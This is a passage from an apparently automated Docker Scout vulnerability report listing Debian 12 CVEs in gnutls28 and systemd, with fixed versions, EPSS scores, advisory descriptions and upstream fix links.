<a href="https://scout.docker.com/v/CVE-2024-0553?s=debian&n=gnutls28&ns=debian&t=deb&osn=debian&osv=12&vr=%3C3.7.9-2%2Bdeb12u2"><img alt="high : CVE--2024--0553" src="https://img.shields.io/badge/CVE--2024--0553-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><3.7.9-2+deb12u2</code></td></tr>
<tr><td>Fixed version</td><td><code>3.7.9-2+deb12u2</code></td></tr>
<tr><td>EPSS Score</td><td><code>1.029%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>77th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability was found in GnuTLS. The response times to malformed ciphertexts in RSA-PSK ClientKeyExchange differ from the response times of ciphertexts with correct PKCS#1 v1.5 padding. This issue may allow a remote attacker to perform a timing side-channel attack in the RSA-PSK key exchange, potentially leading to the leakage of sensitive data. CVE-2024-0553 is designated as an incomplete resolution for CVE-2023-5981.

---
- gnutls28 3.8.3-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1061046)
[bookworm] - gnutls28 3.7.9-2+deb12u2
[bullseye] - gnutls28 3.7.1-5+deb11u5
https://gitlab.com/gnutls/gnutls/-/issues/1522
https://gnutls.org/security-new.html#GNUTLS-SA-2024-01-14
https://gitlab.com/gnutls/gnutls/-/commit/40dbbd8de499668590e8af51a15799fbc430595e (3.8.3)
https://lists.gnupg.org/pipermail/gnutls-help/2024-January/004841.html
Issue exists because of incomplete fix for CVE-2023-5981

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-6395?s=debian&n=gnutls28&ns=debian&t=deb&osn=debian&osv=12&vr=%3C3.7.9-2%2Bdeb12u5"><img alt="medium : CVE--2025--6395" src="https://img.shields.io/badge/CVE--2025--6395-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><3.7.9-2+deb12u5</code></td></tr>
<tr><td>Fixed version</td><td><code>3.7.9-2+deb12u5</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.084%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>25th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A NULL pointer dereference flaw was found in the GnuTLS software in _gnutls_figure_common_ciphersuite().

---
- gnutls28 3.8.9-3
https://lists.gnupg.org/pipermail/gnutls-help/2025-July/004883.html
https://gitlab.com/gnutls/gnutls/-/issues/1718
Fixed by: https://gitlab.com/gnutls/gnutls/-/commit/23135619773e6ec087ff2abc65405bd4d5676bad (3.8.10)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-32990?s=debian&n=gnutls28&ns=debian&t=deb&osn=debian&osv=12&vr=%3C3.7.9-2%2Bdeb12u5"><img alt="medium : CVE--2025--32990" src="https://img.shields.io/badge/CVE--2025--32990-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><3.7.9-2+deb12u5</code></td></tr>
<tr><td>Fixed version</td><td><code>3.7.9-2+deb12u5</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.155%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>37th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A heap-buffer-overflow (off-by-one) flaw was found in the GnuTLS software in the template parsing logic within the certtool utility. When it reads certain settings from a template file, it allows an attacker to cause an out-of-bounds (OOB) NULL pointer write, resulting in memory corruption and a denial-of-service (DoS) that could potentially crash the system.

---
- gnutls28 3.8.9-3
https://lists.gnupg.org/pipermail/gnutls-help/2025-July/004883.html
https://gitlab.com/gnutls/gnutls/-/issues/1696
Fixed by: https://gitlab.com/gnutls/gnutls/-/commit/408bed40c36a4cc98f0c94a818f682810f731f32 (3.8.10)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-32988?s=debian&n=gnutls28&ns=debian&t=deb&osn=debian&osv=12&vr=%3C3.7.9-2%2Bdeb12u5"><img alt="medium : CVE--2025--32988" src="https://img.shields.io/badge/CVE--2025--32988-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><3.7.9-2+deb12u5</code></td></tr>
<tr><td>Fixed version</td><td><code>3.7.9-2+deb12u5</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.117%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>31st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A flaw was found in GnuTLS. A double-free vulnerability exists in GnuTLS due to incorrect ownership handling in the export logic of Subject Alternative Name (SAN) entries containing an otherName. If the type-id OID is invalid or malformed, GnuTLS will call asn1_delete_structure() on an ASN.1 node it does not own, leading to a double-free condition when the parent function or caller later attempts to free the same structure.  This vulnerability can be triggered using only public GnuTLS APIs and may result in denial of service or memory corruption, depending on allocator behavior.

---
- gnutls28 3.8.9-3
https://lists.gnupg.org/pipermail/gnutls-help/2025-July/004883.html
https://gitlab.com/gnutls/gnutls/-/issues/1694
Fixed by: https://gitlab.com/gnutls/gnutls/-/commit/608829769cbc247679ffe98841109fc73875e573 (3.8.10)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-5981?s=debian&n=gnutls28&ns=debian&t=deb&osn=debian&osv=12&vr=%3C3.7.9-2%2Bdeb12u1"><img alt="medium : CVE--2023--5981" src="https://img.shields.io/badge/CVE--2023--5981-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><3.7.9-2+deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><code>3.7.9-2+deb12u1</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.573%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>68th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability was found that the response times to malformed ciphertexts in RSA-PSK ClientKeyExchange differ from response times of ciphertexts with correct PKCS#1 v1.5 padding.

---
- gnutls28 3.8.2-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1056188)
[bookworm] - gnutls28 3.7.9-2+deb12u1
[bullseye] - gnutls28 3.7.1-5+deb11u4
https://gitlab.com/gnutls/gnutls/-/issues/1511
https://gnutls.org/security-new.html#GNUTLS-SA-2023-10-23
https://lists.gnupg.org/pipermail/gnutls-help/2023-November/004837.html
Fixed by: https://gitlab.com/gnutls/gnutls/-/commit/29d6298d0b04cfff970b993915db71ba3f580b6d (3.8.2)
Fixing this issue incompletely opens up CVE-2024-0553

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-28834?s=debian&n=gnutls28&ns=debian&t=deb&osn=debian&osv=12&vr=%3C3.7.9-2%2Bdeb12u3"><img alt="medium : CVE--2024--28834" src="https://img.shields.io/badge/CVE--2024--28834-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><3.7.9-2+deb12u3</code></td></tr>
<tr><td>Fixed version</td><td><code>3.7.9-2+deb12u3</code></td></tr>
<tr><td>EPSS Score</td><td><code>1.705%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>82nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A flaw was found in GnuTLS. The Minerva attack is a cryptographic vulnerability that exploits deterministic behavior in systems like GnuTLS, leading to side-channel leaks. In specific scenarios, such as when using the GNUTLS_PRIVKEY_FLAG_REPRODUCIBLE flag, it can result in a noticeable step in nonce size from 513 to 512 bits, exposing a potential timing side-channel.

---
[experimental] - gnutls28 3.8.4-1
- gnutls28 3.8.4-2 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1067464)
[bookworm] - gnutls28 3.7.9-2+deb12u3
[buster] - gnutls28 <not-affected> (Vulnerable code not present)
https://gitlab.com/gnutls/gnutls/-/issues/1516
https://lists.gnupg.org/pipermail/gnutls-help/2024-March/004845.html
https://www.gnutls.org/security-new.html#GNUTLS-SA-2023-12-04
Fixed by: https://gitlab.com/gnutls/gnutls/-/commit/1c4701ffc342259fc5965d5a0de90d87f780e3e5 (3.8.4)
Introduced with: https://gitlab.com/gnutls/gnutls/-/merge_requests/1051 (gnutls_3_6_10)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-12243?s=debian&n=gnutls28&ns=debian&t=deb&osn=debian&osv=12&vr=%3C3.7.9-2%2Bdeb12u4"><img alt="medium : CVE--2024--12243" src="https://img.shields.io/badge/CVE--2024--12243-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><3.7.9-2+deb12u4</code></td></tr>
<tr><td>Fixed version</td><td><code>3.7.9-2+deb12u4</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.526%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>66th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A flaw was found in GnuTLS, which relies on libtasn1 for ASN.1 data processing. Due to an inefficient algorithm in libtasn1, decoding certain DER-encoded certificate data can take excessive time, leading to increased resource consumption. This flaw allows a remote attacker to send a specially crafted certificate, causing GnuTLS to become unresponsive or slow, resulting in a denial-of-service condition.

---
[experimental] - gnutls28 3.8.9-1
- gnutls28 3.8.9-2
https://www.gnutls.org/security-new.html#GNUTLS-SA-2025-02-07
https://lists.gnupg.org/pipermail/gnutls-help/2025-February/004875.html
https://gitlab.com/gnutls/gnutls/-/issues/1553
Fixed by: https://gitlab.com/gnutls/gnutls/-/commit/4760bc63531e3f5039e70ede91a20e1194410892 (3.8.9)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-28835?s=debian&n=gnutls28&ns=debian&t=deb&osn=debian&osv=12&vr=%3C3.7.9-2%2Bdeb12u3"><img alt="medium : CVE--2024--28835" src="https://img.shields.io/badge/CVE--2024--28835-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><3.7.9-2+deb12u3</code></td></tr>
<tr><td>Fixed version</td><td><code>3.7.9-2+deb12u3</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.014%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>2nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A flaw has been discovered in GnuTLS where an application crash can be induced when attempting to verify a specially crafted .pem bundle using the "certtool --verify-chain" command.

---
[experimental] - gnutls28 3.8.4-1
- gnutls28 3.8.4-2 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1067463)
[bookworm] - gnutls28 3.7.9-2+deb12u3
[buster] - gnutls28 <not-affected> (Vulnerable code not present)
https://bugzilla.redhat.com/show_bug.cgi?id=2269084
https://gitlab.com/gnutls/gnutls/-/issues/1525
https://gitlab.com/gnutls/gnutls/-/issues/1527
https://lists.gnupg.org/pipermail/gnutls-help/2024-March/004845.html
https://www.gnutls.org/security-new.html#GNUTLS-SA-2024-01-23
Fixed by: https://gitlab.com/gnutls/gnutls/-/commit/e369e67a62f44561d417cb233acc566cc696d82d (3.8.4)
Introduced with: https://gitlab.com/gnutls/gnutls/-/commit/d268f19510a95f92d11d8f8dc7d94fcae4d765cc (3.7.0)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-32989?s=debian&n=gnutls28&ns=debian&t=deb&osn=debian&osv=12&vr=%3C3.7.9-2%2Bdeb12u5"><img alt="low : CVE--2025--32989" src="https://img.shields.io/badge/CVE--2025--32989-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><3.7.9-2+deb12u5</code></td></tr>
<tr><td>Fixed version</td><td><code>3.7.9-2+deb12u5</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.086%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>25th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A heap-buffer-overread vulnerability was found in GnuTLS in how it handles the Certificate Transparency (CT) Signed Certificate Timestamp (SCT) extension during X.509 certificate parsing. This flaw allows a malicious user to create a certificate containing a malformed SCT extension (OID 1.3.6.1.4.1.11129.2.4.2) that contains sensitive data. This issue leads to the exposure of confidential information when GnuTLS verifies certificates from certain websites when the certificate (SCT) is not checked correctly.

---
- gnutls28 3.8.9-3
[bullseye] - gnutls28 <not-affected> (Vulnerable code introduced later)
https://lists.gnupg.org/pipermail/gnutls-help/2025-July/004883.html
https://gitlab.com/gnutls/gnutls/-/issues/1695
Introduced by: https://gitlab.com/gnutls/gnutls/-/commit/242abb6945cbb56c4a41c393d0253ea5b9d3a36a (3.7.3)
Fixed by: https://gitlab.com/gnutls/gnutls/-/commit/8e5ca951257202089246fa37e93a99d210ee5ca2 (3.8.10)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2011-3389?s=debian&n=gnutls28&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D3.7.9-2%2Bdeb12u5"><img alt="low : CVE--2011--3389" src="https://img.shields.io/badge/CVE--2011--3389-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=3.7.9-2+deb12u5</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>4.129%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>88th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

The SSL protocol, as used in certain configurations in Microsoft Windows and Microsoft Internet Explorer, Mozilla Firefox, Google Chrome, Opera, and other products, encrypts data by using CBC mode with chained initialization vectors, which allows man-in-the-middle attackers to obtain plaintext HTTP headers via a blockwise chosen-boundary attack (BCBA) on an HTTPS session, in conjunction with JavaScript code that uses (1) the HTML5 WebSocket API, (2) the Java URLConnection API, or (3) the Silverlight WebClient API, aka a "BEAST" attack.

---
- sun-java6 <removed> (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=645881)
[lenny] - sun-java6 <no-dsa> (Non-free not supported)
[squeeze] - sun-java6 <no-dsa> (Non-free not supported)
- openjdk-6 6b23~pre11-1
- openjdk-7 7~b147-2.0-1
- iceweasel <not-affected> (Vulnerable code not present)
http://blog.mozilla.com/security/2011/09/27/attack-against-tls-protected-communications/
- chromium-browser 15.0.874.106~r107270-1
[squeeze] - chromium-browser <end-of-life>
- lighttpd 1.4.30-1
strictly speaking this is no lighttpd issue, but lighttpd adds a workaround
- curl 7.24.0-1
http://curl.haxx.se/docs/adv_20120124B.html
- python2.6 2.6.8-0.1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=684511)
[squeeze] - python2.6 <no-dsa> (Minor issue)
- python2.7 2.7.3~rc1-1
- python3.1 <unfixed> (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=678998)
[squeeze] - python3.1 <no-dsa> (Minor issue)
- python3.2 3.2.3~rc1-1
http://bugs.python.org/issue13885
python3.1 is fixed starting 3.1.5
- cyassl <removed>
- gnutls26 <removed> (unimportant)
- gnutls28 <unfixed> (unimportant)
No mitigation for gnutls, it is recommended to use TLS 1.1 or 1.2 which is supported since 2.0.0
- haskell-tls <unfixed> (unimportant)
No mitigation for haskell-tls, it is recommended to use TLS 1.1, which is supported since 0.2
- matrixssl <removed> (low)
[squeeze] - matrixssl <no-dsa> (Minor issue)
[wheezy] - matrixssl <no-dsa> (Minor issue)
matrixssl fix this upstream in 3.2.2
- bouncycastle 1.49+dfsg-1
[squeeze] - bouncycastle <no-dsa> (Minor issue)
[wheezy] - bouncycastle <no-dsa> (Minor issue)
No mitigation for bouncycastle, it is recommended to use TLS 1.1, which is supported since 1.4.9
- nss 3.13.1.with.ckbi.1.88-1
https://bugzilla.mozilla.org/show_bug.cgi?id=665814
https://hg.mozilla.org/projects/nss/rev/7f7446fcc7ab
- polarssl <unfixed> (unimportant)
No mitigation for polarssl, it is recommended to use TLS 1.1, which is supported in all releases
- tlslite <removed>
[wheezy] - tlslite <no-dsa> (Minor issue)
- pound 2.6-2
Pound 2.6-2 added an anti_beast.patch to mitigate BEAST attacks.
- erlang 1:15.b-dfsg-1
[squeeze] - erlang <no-dsa> (Minor issue)
- asterisk 1:13.7.2~dfsg-1
[jessie] - asterisk 1:11.13.1~dfsg-2+deb8u1
[wheezy] - asterisk <no-dsa> (Minor issue)
[squeeze] - asterisk <end-of-life> (Not supported in Squeeze LTS)
http://downloads.digium.com/pub/security/AST-2016-001.html
https://issues.asterisk.org/jira/browse/ASTERISK-24972
patch for 11 (jessie): https://code.asterisk.org/code/changelog/asterisk?cs=f233bcd81d85626ce5bdd27b05bc95d131faf3e4
all versions vulnerable, backport required for wheezy

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 2" src="https://img.shields.io/badge/H-2-e25d68"/> <img alt="medium: 2" src="https://img.shields.io/badge/M-2-fbb552"/> <img alt="low: 4" src="https://img.shields.io/badge/L-4-fce1a9"/> <!-- unspecified: 0 --><strong>systemd</strong> <code>252.17-1~deb12u1</code> (deb)</summary>

<small><code>pkg:deb/debian/systemd@252.17-1~deb12u1?os_distro=bookworm&os_name=debian&os_version=12</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2023-50868?s=debian&n=systemd&ns=debian&t=deb&osn=debian&osv=12&vr=%3C252.23-1%7Edeb12u1"><img alt="high : CVE--2023--50868" src="https://img.shields.io/badge/CVE--2023--50868-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><252.23-1~deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><code>252.23-1~deb12u1</code></td></tr>
<tr><td>EPSS Score</td><td><code>13.757%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>94th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

The Closest Encloser Proof aspect of the DNS protocol (in RFC 5155 when RFC 9276 guidance is skipped) allows remote attackers to cause a denial of service (CPU consumption for SHA-1 computations) via DNSSEC responses in a random subdomain attack, aka the "NSEC3" issue. The RFC 5155 specification implies that an algorithm must perform thousands of iterations of a hash function in certain situations.

---
- bind9 1:9.19.21-1
- dnsmasq 2.90-1
[bookworm] - dnsmasq 2.90-4~deb12u1
- knot-resolver 5.7.1-1
[bullseye] - knot-resolver <ignored> (Too intrusive to backport, if DNSSEC is used Bookworm can be used)
[buster] - knot-resolver <ignored> (Too intrusive to backport, if DNSSEC is used Bookworm can be used)
- pdns-recursor 4.9.3-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1063852)
[bullseye] - pdns-recursor <end-of-life> (No longer supported with security updates in Bullseye)
- unbound 1.19.1-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1063845)
- systemd 255.4-1
[bookworm] - systemd 252.23-1~deb12u1
[buster] - systemd <no-dsa> (DNSSEC is disabled by default in systemd-resolved; can be fixed via point release)
- dnsjava 3.6.2-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1077751)
[bookworm] - dnsjava <no-dsa> (Minor issue)
[bullseye] - dnsjava <no-dsa> (Minor issue)
https://kb.isc.org/docs/cve-2023-50868
https://downloads.isc.org/isc/bind9/9.16.48/patches/0005-CVE-2023-50387-CVE-2023-50868.patch
https://lists.thekelleys.org.uk/pipermail/dnsmasq-discuss/2024q1/017430.html
https://www.knot-resolver.cz/2024-02-13-knot-resolver-5.7.1.html
https://github.com/CZ-NIC/knot-resolver/commit/e966b7fdb167add0ec37c56a954c2d847f627985 (v5.7.1)
https://github.com/CZ-NIC/knot-resolver/commit/eccb8e278c1cde0548cc570eac619feaa290cede (v5.7.1)
https://github.com/CZ-NIC/knot-resolver/commit/b5051ac26f34358b40f9115f977fe1f54e8f581e (v5.7.1)
https://github.com/CZ-NIC/knot-resolver/commit/24699e9f206a8f957b516cad22a8e5790d226836 (v5.7.1)
https://github.com/CZ-NIC/knot-resolver/commit/a05cf1d379d1af0958587bd111f791b72f404364 (v5.7.1)
https://github.com/CZ-NIC/knot-resolver/commit/9b421cdf91f987e0254a06ff2c4e8fbf76dc2b58 (v5.7.1)
https://github.com/CZ-NIC/knot-resolver/commit/5e80624b18d40ae44be704751d3b22943edf287f
https://github.com/CZ-NIC/knot-resolver/commit/f9ba52e6f54bc1db122870df50cb364cb977436e (v5.7.1)
https://github.com/CZ-NIC/knot-resolver/commit/b044babbee358dc305d770a1dab3a877c49468a7 (v5.7.1)
https://blog.powerdns.com/2024/02/13/powerdns-recursor-4-8-6-4-9-3-5-0-2-released
Fixed by: https://github.com/PowerDNS/pdns/pull/13781
https://nlnetlabs.nl/news/2024/Feb/13/unbound-1.19.1-released/
https://nlnetlabs.nl/downloads/unbound/CVE-2023-50387_CVE-2023-50868.txt
Fixed by: https://github.com/NLnetLabs/unbound/commit/92f2a1ca690a44880f4c4fa70a4b5a4b029aaf1c (release-1.19.1)
https://github.com/systemd/systemd/issues/31413
https://github.com/systemd/systemd/commit/67d0ce8843d612a2245d0966197d4f528b911b66 (v256)
https://github.com/systemd/systemd/commit/eba291124bc11f03732d1fc468db3bfac069f9cb (v256)
https://github.com/systemd/systemd-stable/commit/1ebdb19ff194120109b08bbf888bdcc502f83211 (v255.4)
https://github.com/systemd/systemd-stable/commit/572692f0bdd6a3fabe3dd4a3e8e5565cc69b5e14 (v255.4)
https://github.com/systemd/systemd-stable/commit/2f5edffa8ffd5210165ebe7604f07d23f375fe9a (v254.10)
https://github.com/systemd/systemd-stable/commit/9899281c59a91f19c8b39362d203e997d2faf233 (v254.10)
https://github.com/systemd/systemd-stable/commit/7886eea2425fe7773cc012da0b2e266e33d4be12 (v253.17)
https://github.com/systemd/systemd-stable/commit/156e519d990a5662c719a1cbe80c6a02a2b9115f (v253.17)
https://github.com/systemd/systemd-stable/commit/7633d969f3422f9ad380a512987d398e54764817 (v252.23)
https://github.com/systemd/systemd-stable/commit/b43bcb51ebf9aea21b1e280e1872056994e3f53d (v252.23)
systemd: DNSSEC is default to off in systemd-resolved
https://github.com/advisories/GHSA-mmwx-rj87-vfgr
https://github.com/dnsjava/dnsjava/commit/711af79be3214f52daa5c846b95766dc0a075116 (v3.6.0)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-50387?s=debian&n=systemd&ns=debian&t=deb&osn=debian&osv=12&vr=%3C252.23-1%7Edeb12u1"><img alt="high : CVE--2023--50387" src="https://img.shields.io/badge/CVE--2023--50387-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><252.23-1~deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><code>252.23-1~deb12u1</code></td></tr>
<tr><td>EPSS Score</td><td><code>50.801%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>98th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Certain DNSSEC aspects of the DNS protocol (in RFC 4033, 4034, 4035, 6840, and related RFCs) allow remote attackers to cause a denial of service (CPU consumption) via one or more DNSSEC responses, aka the "KeyTrap" issue. One of the concerns is that, when there is a zone with many DNSKEY and RRSIG records, the protocol specification implies that an algorithm must evaluate all combinations of DNSKEY and RRSIG records.

---
- bind9 1:9.19.21-1
- dnsmasq 2.90-1
[bookworm] - dnsmasq 2.90-4~deb12u1
- knot-resolver 5.7.1-1
[bullseye] - knot-resolver <ignored> (Too intrusive to backport, if DNSSEC is used Bookworm can be used)
[buster] - knot-resolver <ignored> (Too intrusive to backport)
- pdns-recursor 4.9.3-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1063852)
[bullseye] - pdns-recursor <end-of-life> (No longer supported with security updates in Bullseye)
- unbound 1.19.1-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1063845)
- systemd 255.4-1
[bookworm] - systemd 252.23-1~deb12u1
[buster] - systemd <no-dsa> (DNSSEC is disabled by default in systemd-resolved; can be fixed via point release)
- dnsjava 3.6.2-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1077750)
[bookworm] - dnsjava <no-dsa> (Minor issue)
[bullseye] - dnsjava <no-dsa> (Minor issue)
https://kb.isc.org/docs/cve-2023-50387
https://gitlab.isc.org/isc-projects/bind9/-/commit/c12608ca934c0433d280e65fe6c631013e200cfe (v9.16.48)
https://gitlab.isc.org/isc-projects/bind9/-/commit/751b7cc4750ede6d8c5232751d60aad8ad84aa67 (v9.16.48)
https://gitlab.isc.org/isc-projects/bind9/-/commit/6a65a425283d70da86bf732449acd6d7c8dec718 (v9.16.48)
https://gitlab.isc.org/isc-projects/bind9/-/commit/3d206e918b3efbc20074629ad9d99095fbd2e5fd (v9.16.48)
https://gitlab.isc.org/isc-projects/bind9/-/commit/a520fbc0470a0d6b72db6aa0b8deda8798551614 (v9.16.48)
https://downloads.isc.org/isc/bind9/9.16.48/patches/0005-CVE-2023-50387-CVE-2023-50868.patch
https://lists.thekelleys.org.uk/pipermail/dnsmasq-discuss/2024q1/017430.html
https://www.knot-resolver.cz/2024-02-13-knot-resolver-5.7.1.html
https://github.com/CZ-NIC/knot-resolver/commit/7ddabe80fa05b76fc57b5a112a82a2c032032534
https://github.com/CZ-NIC/knot-resolver/commit/feb65eb97b93f0f024d70c7f5f6cbc6802ba02ec (v5.7.1)
https://github.com/CZ-NIC/knot-resolver/commit/cc5051b4441307d9b262fa382bc715391112ddbb (v5.7.1)
https://blog.powerdns.com/2024/02/13/powerdns-recursor-4-8-6-4-9-3-5-0-2-released
Fixed by: https://github.com/PowerDNS/pdns/pull/13781
https://nlnetlabs.nl/news/2024/Feb/13/unbound-1.19.1-released/
https://nlnetlabs.nl/downloads/unbound/CVE-2023-50387_CVE-2023-50868.txt
Fixed by: https://github.com/NLnetLabs/unbound/commit/882903f2fa800c4cb6f5e225b728e2887bb7b9ae (release-1.19.1)
https://github.com/systemd/systemd/issues/31413
https://github.com/systemd/systemd/commit/67d0ce8843d612a2245d0966197d4f528b911b66 (v256)
https://github.com/systemd/systemd/commit/eba291124bc11f03732d1fc468db3bfac069f9cb (v256)
https://github.com/systemd/systemd-stable/commit/1ebdb19ff194120109b08bbf888bdcc502f83211 (v255.4)
https://github.com/systemd/systemd-stable/commit/572692f0bdd6a3fabe3dd4a3e8e5565cc69b5e14 (v255.4)
https://github.com/systemd/systemd-stable/commit/2f5edffa8ffd5210165ebe7604f07d23f375fe9a (v254.10)
https://github.com/systemd/systemd-stable/commit/9899281c59a91f19c8b39362d203e997d2faf233 (v254.10)
https://github.com/systemd/systemd-stable/commit/7886eea2425fe7773cc012da0b2e266e33d4be12 (v253.17)
https://github.com/systemd/systemd-stable/commit/156e519d990a5662c719a1cbe80c6a02a2b9115f (v253.17)
https://github.com/systemd/systemd-stable/commit/7633d969f3422f9ad380a512987d398e54764817 (v252.23)
https://github.com/systemd/systemd-stable/commit/b43bcb51ebf9aea21b1e280e1872056994e3f53d (v252.23)
systemd: DNSSEC is default to off in systemd-resolved
https://github.com/advisories/GHSA-crjg-w57m-rqqf
https://github.com/dnsjava/dnsjava/commit/07ac36a11578cc1bce0cd8ddf2fe568f062aee78 (v3.6.0)
https://github.com/dnsjava/dnsjava/commit/3ddc45ce8cdb5c2274e10b7401416f497694e1cf (v3.6.0)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-7008?s=debian&n=systemd&ns=debian&t=deb&osn=debian&osv=12&vr=%3C252.21-1%7Edeb12u1"><img alt="medium : CVE--2023--7008" src="https://img.shields.io/badge/CVE--2023--7008-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><252.21-1~deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><code>252.21-1~deb12u1</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.477%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>64th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability was found in systemd-resolved. This issue may allow systemd-resolved to accept records of DNSSEC-signed domains even when they have no signature, allowing man-in-the-middles (or the upstream DNS resolver) to manipulate records.

---
- systemd 255.1-3 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1059278)
[bookworm] - systemd 252.21-1~deb12u1
[buster] - systemd <no-dsa> (Minor issue)
https://bugzilla.redhat.com/show_bug.cgi?id=2222672
https://github.com/systemd/systemd/issues/25676
systemd-resolved defaults to DNSSEC=no (disabled) everywhere, and is affected only
when manually enabled.
Introduced by: https://github.com/systemd/systemd/commit/105e151299dc1208855380be2b22d0db2d66ebc6 (v229)
Fixed by: https://github.com/systemd/systemd/commit/3b4cc1437b51fcc0b08da8cc3f5d1175eed25eb1 (v256)
Fixed by: https://github.com/systemd/systemd-stable/commit/6da5ca9dd69c0e3340d4439413718ad4963252de (v255.2)
Fixed by: https://github.com/systemd/systemd-stable/commit/029272750fe451aeaac87a8c783cfb067f001e16 (v254.8)
Fixed by: https://github.com/systemd/systemd-stable/commit/5c149c77cbf7b3743fa65ce7dc9d2b5a58351968 (v253.15)
Fixed by: https://github.com/systemd/systemd-stable/commit/bb78da7f955c0102047319c55fff9d853ab7c87a (v252.21)
Fixed by: https://github.com/systemd/systemd-stable/commit/f58fc88678b893162f2d6d4b2db094e7b1646386 (v251.20)
Fixed by: https://github.com/systemd/systemd-stable/commit/4ada1290584745ab6643eece9e1756a8c0e079ca (v250.14)
Fixed by: https://github.com/systemd/systemd-stable/commit/c8578cef7f0f1e8cb8193c29e5e77daf4e3a1c9f (v249.17)
Fixed by: https://github.com/systemd/systemd-stable/commit/3a409b210396c6a0bef621349f4caa3a865940f2 (v248.13)

</blockquote>
</details>

